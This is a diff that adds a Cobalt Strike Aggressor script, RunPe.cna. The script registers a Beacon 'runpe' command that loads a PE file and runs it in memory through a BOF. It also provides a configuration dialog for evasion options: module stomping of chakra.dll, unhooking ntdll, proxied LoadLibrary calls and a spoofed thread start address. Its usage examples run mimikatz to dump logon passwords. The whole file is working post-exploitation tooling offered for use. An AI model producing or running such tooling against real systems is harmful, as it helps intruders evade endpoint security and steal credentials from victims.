@@ -1,0 +1,362 @@
+# ================================================================
+# RunPe.cna - Cobalt Strike Aggressor Script
+# ================================================================
+# Execute PE files in memory with advanced customization options
+# ================================================================
+
+beacon_command_register(
+    "runpe",
+    "Execute PE file in memory with custom configuration",
+    "Synopsis: runpe --file <pe_path> [--args <arguments>]\n" .
+    "\nDescription:\n" .
+    "  Executes a PE file in the current process memory with advanced options.\n" .
+    "  Configure execution parameters via: Additionals postex -> RunPe Config\n\n" .
+    "Arguments:\n" .
+    "  --file <pe_path>    Path to the PE file to execute (required)\n" .
+    "  --args <arguments>  Optional command-line arguments for the PE\n\n" .
+    "Examples:\n" .
+    "  runpe --file C:\\tools\\mimikatz.exe --args privilege::debug sekurlsa::logonpasswords exit\n" .
+    "  runpe --file /tmp/tool.exe --args arg1 arg2 arg3"
+);
+
+# ================================================================
+# DEFAULT CONFIGURATION
+# ================================================================
+$proxy_method = "Regwait";
+$memory_allocation = "Module stomping";
+$stomp_module = "chakra.dll";
+$alloc_rwx = "false";
+$unhook_ntdll = "false";
+$thread_start_module = "ntdll.dll";
+$thread_start_function = "RtlUserThreadStart";
+$thread_start_offset = 33;
+$thread_timeout = 5000;
+
+# ================================================================
+# APPLY CONFIGURATION CALLBACK
+# ================================================================
+sub ApplyRunPeConfig {
+    println("\n" . "[" . tstamp(ticks()) . "] RunPe Configuration Update");
+    println("=" x 60);
+
+    $proxy_method = $3['proxy_method'];
+    $memory_allocation = $3['memory_allocation'];
+    $stomp_module = $3['stomp_module'];
+    $alloc_rwx = $3['alloc_rwx'];
+    $unhook_ntdll = $3['unhook_ntdll'];
+    $thread_start_module = $3['thread_start_module'];
+    $thread_start_function = $3['thread_start_function'];
+    $thread_start_offset = $3['thread_start_offset'];
+    $thread_timeout = $3['thread_timeout'];
+
+    println("Proxy method:           $proxy_method");
+    println("Memory allocation:      $memory_allocation");
+    println("Stomp module:           $stomp_module");
+    println("Alloc RWX:              $alloc_rwx");
+    println("Unhook ntdll:           $unhook_ntdll");
+    println("Thread start module:    $thread_start_module");
+    println("Thread start function:  $thread_start_function");
+    println("Thread start offset:    $thread_start_offset");
+    println("Thread timeout:         $thread_timeout ms");
+    println("=" x 60);
+    println("[+] Configuration applied successfully\n");
+}
+
+# ================================================================
+# CONFIGURATION DIALOG
+# ================================================================
+sub RunPeConfig {
+    $dialog = dialog("RunPe Configuration", 
+        %(proxy_method => $proxy_method,
+        memory_allocation => $memory_allocation,
+        stomp_module => $stomp_module,
+        alloc_rwx => $alloc_rwx,
+        unhook_ntdll => $unhook_ntdll,
+        thread_start_module => $thread_start_module,
+        thread_start_function => $thread_start_function,
+        thread_start_offset => $thread_start_offset,
+        thread_timeout => $thread_timeout),
+        &ApplyRunPeConfig);
+
+    dialog_description($dialog,
+        "Configure PE execution parameters:\n\n" . 
+        "Proxy Method:          Method to call LoadLibraryA (None, Timer, Regwait, Draugr)\n" .
+        "Memory Allocation:     Allocator type (Heap, VirtualAlloc, Module stomping)\n" .
+        "Stomp Module:          Module name for stomping allocation\n" .
+        "Alloc RWX:             Allocate memory with RWX permissions\n" .
+        "Unhook Ntdll:          Create fresh copy of ntdll to remove hooks\n" .
+        "Thread Start Module:   Module containing thread start address\n" .
+        "Thread Start Function: Function name for thread start\n" .
+        "Thread Start Offset:   Offset from function start\n" .
+        "Thread Timeout:        Timeout in milliseconds (0 = no timeout)"
+    );
+
+    drow_combobox($dialog, "proxy_method", "Proxy Method:", 
+        @("None", "Timer", "Regwait", "Draugr"));
+
+    drow_combobox($dialog, "memory_allocation", "Memory Allocation:", 
+        @("Heap", "VirtualAlloc", "Module stomping"));
+
+    drow_text($dialog, "stomp_module", "Stomp Module:");
+    drow_text($dialog, "thread_start_module", "Thread Start Module:");
+    drow_text($dialog, "thread_start_function", "Thread Start Function:");
+    drow_text($dialog, "thread_start_offset", "Thread Start Offset:");
+    drow_text($dialog, "thread_timeout", "Thread Timeout (ms):");
+    drow_checkbox($dialog, "unhook_ntdll", "Unhook Ntdll");
+    drow_checkbox($dialog, "alloc_rwx", "Allocate in RWX");
+
+    dbutton_action($dialog, "Apply Configuration");
+    dialog_show($dialog);
+}
+
+# ================================================================
+# HELPER: MAP PROXY METHOD TO INTEGER
+# ================================================================
+sub get_proxy_method_value {
+    if ($1 eq "None") {
+        return 0;
+    } else if ($1 eq "Draugr") {
+        return 1;
+    } else if ($1 eq "Regwait") {
+        return 2;
+    } else if ($1 eq "Timer") {
+        return 3;
+    }
+    return 2; # Default to Regwait
+}
+
+# ================================================================
+# HELPER: MAP ALLOCATION METHOD TO INTEGER
+# ================================================================
+sub get_allocation_method_value {
+    if ($1 eq "Heap") {
+        return 0;
+    } else if ($1 eq "VirtualAlloc") {
+        return 1;
+    } else if ($1 eq "Module stomping") {
+        return 2;
+    }
+    return 1; # Default to VirtualAlloc
+}
+
+# ================================================================
+# HELPER: CONVERT BOOLEAN TO INTEGER
+# ================================================================
+sub bool_to_int {
+    if ($1 eq "false" || $1 eq false) {
+        return 0;
+    }
+    return 1;
+}
+
+# ================================================================
+# HELPER: GET BOF PATH
+# ================================================================
+sub get_runpe_bof_path {
+    # Try current directory first
+    $bof_path = script_resource("Bin/runpe.o");
+    if (-exists $bof_path) {
+        return $bof_path;
+    }
+    
+    # Return relative path and let it fail with descriptive error
+    return "Bin/runpe.o";
+}
+
+# ================================================================
+# HELPER: PARSE COMMAND LINE ARGUMENTS
+# ================================================================
+sub parse_runpe_args {
+    local('$pe_path $args $cmd_line $file_idx $args_idx $temp');
+    
+    $cmd_line = $1;
+    $pe_path = "";
+    $args = "";
+    
+    # Find --file position
+    $file_idx = indexOf($cmd_line, "--file");
+    
+    if ($file_idx == -1) {
+        # --file not found, return empty
+        return @("", "");
+    }
+    
+    # Extract text after "--file " (note the space)
+    $temp = substr($cmd_line, $file_idx);
+    
+    # Check if there's --args
+    $args_idx = indexOf($temp, " --args");
+    
+    if ($args_idx != -1) {
+        # Split at --args
+        $pe_path = substr($temp, 0, $args_idx);
+        $args = substr($temp, $args_idx + 8); # Skip " --args "
+    } else {
+        # No args, entire temp is the path
+        $pe_path = $temp;
+    }
+    
+    return @($pe_path, $args);
+}
+
+# ================================================================
+# ALIAS: runpe
+# ================================================================
+alias runpe {
+    local('$pe_path $pe_args $pe_data $bof_path $bof_data');
+    local('$proxy_value $alloc_value $rwx_value $unhook_value');
+    local('$args_packed $cmd_line $i');
+    
+    # Reconstruct full command line from all arguments
+    $cmd_line = "";
+    for ($i = 2; $i < size(@_); $i++) {
+        if (strlen($cmd_line) > 0) {
+            $cmd_line .= " ";
+        }
+        $cmd_line .= @_[$i];
+    }
+    
+    if (strlen($cmd_line) == 0) {
+        berror($1, "Missing required argument: --file <pe_path>");
+        berror($1, "Usage: runpe --file <pe_path> [--args <arguments>]");
+        berror($1, "Example: runpe --file C:\\Tools\\mimikatz64.exe --args coffee exit");
+        return;
+    }
+
+    println("\n" . "[" . tstamp(ticks()) . "] RunPe Execution Request");
+    println("=" x 60);
+    
+    # Debug: show raw input
+    println("DEBUG: Raw input: " . $cmd_line);
+
+    # Parse command line to extract PE path and arguments
+    @parsed = parse_runpe_args($cmd_line);
+    
+    if (size(@parsed) < 2) {
+        berror($1, "Failed to parse command line");
+        return;
+    }
+    
+    $pe_path = @parsed[0];
+    $pe_args = @parsed[1];
+    
+    # Debug: show parsed values
+    println("DEBUG: Parsed PE path: " . $pe_path);
+    println("DEBUG: Parsed args: " . $pe_args);
+    
+    # Check if --file was provided
+    if (strlen($pe_path) == 0) {
+        berror($1, "Missing required argument: --file <pe_path>");
+        berror($1, "Usage: runpe --file <pe_path> [--args <arguments>]");
+        berror($1, "Example: runpe --file C:\\Tools\\mimikatz64.exe --args coffee exit");
+        return;
+    }
+    
+    println("PE Path:       " . $pe_path);
+    if (strlen($pe_args) > 0) {
+        println("PE Arguments:  " . $pe_args);
+    } else {
+        println("PE Arguments:  (none)");
+    }
+
+    # Validate architecture
+    $barch = barch($1);
+    if ($barch !eq 'x64') {
+        berror($1, "This BOF only supports x64 architecture");
+        return;
+    }
+
+    # Validate PE file exists
+    if (!-exists $pe_path) {
+        berror($1, "PE file not found: $pe_path");
+        return;
+    }
+
+    # Load PE file
+    $pe_handle = openf($pe_path);
+    if ($pe_handle is $null) {
+        berror($1, "Failed to open PE file: $pe_path");
+        return;
+    }
+    $pe_data = readb($pe_handle, -1);
+    closef($pe_handle);
+
+    if (strlen($pe_data) == 0) {
+        berror($1, "PE file is empty: $pe_path");
+        return;
+    }
+
+    println("PE Size:       " . strlen($pe_data) . " bytes");
+
+    # Convert configuration to integers
+    $proxy_value = get_proxy_method_value($proxy_method);
+    $alloc_value = get_allocation_method_value($memory_allocation);
+    $rwx_value = bool_to_int($alloc_rwx);
+    $unhook_value = bool_to_int($unhook_ntdll);
+
+    println("\n[+] Current Configuration:");
+    println("    Proxy method:      $proxy_value");
+    println("    Allocation:        $alloc_value");
+    println("    Stomp module:      $stomp_module");
+    println("    Alloc RWX:         $rwx_value");
+    println("    Unhook ntdll:      $unhook_value");
+    println("    Thread module:     $thread_start_module");
+    println("    Thread function:   $thread_start_function");
+    println("    Thread offset:     $thread_start_offset");
+    println("    Timeout:           $thread_timeout ms");
+
+    # Load BOF
+    $bof_path = get_runpe_bof_path();
+    if (!-exists $bof_path) {
+        berror($1, "BOF file not found at: $bof_path");
+        berror($1, "Please ensure Bin/runpe.o exists in the script directory");
+        return;
+    }
+
+    $bof_handle = openf($bof_path);
+    $bof_data = readb($bof_handle, -1);
+    closef($bof_handle);
+
+    println("\n[*] Packing arguments and executing BOF...");
+    println("=" x 60 . "\n");
+
+    # Pack arguments according to CONFIG structure
+    # Format: iiziiizzizb
+    # - Proxy method (int)
+    # - Allocation method (int)
+    # - Stomp module (string -> BYTE[32])
+    # - AllocRWX (int/bool)
+    # - UnhookNtdll (int/bool)
+    # - Timeout (int)
+    # - Thread module name (string -> BYTE[64])
+    # - Thread function name (string -> BYTE[64])
+    # - Thread offset (int)
+    # - PE arguments (string)
+    # - PE data (binary)
+    $args_packed = bof_pack($1, "iiziiizzizb",
+        $proxy_value,
+        $alloc_value,
+        $stomp_module,
+        $rwx_value,
+        $unhook_value,
+        $thread_timeout,
+        $thread_start_module,
+        $thread_start_function,
+        $thread_start_offset,
+        $pe_args,
+        $pe_data
+    );
+    
+    beacon_inline_execute($1, $bof_data, "go", $args_packed);
+}
+
+# ================================================================
+# UI INTEGRATION
+# ================================================================
+popup custom_additionals {
+    item "RunPe Config" {
+        RunPeConfig();
+    }
+}
+
+menubar("Additionals postex", "custom_additionals");
